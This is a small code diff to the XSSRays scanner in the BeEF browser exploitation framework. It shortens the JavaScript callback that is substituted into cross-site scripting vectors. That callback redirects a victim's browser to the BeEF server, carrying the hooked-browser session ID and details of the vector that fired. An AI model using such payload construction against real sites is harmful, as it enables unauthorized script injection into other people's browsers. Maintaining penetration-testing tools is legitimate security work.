@@ -340,7 +340,7 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                        beefCallback = "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
                             + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                         exploit = vector.input.replace(/XSS/g, beefCallback);
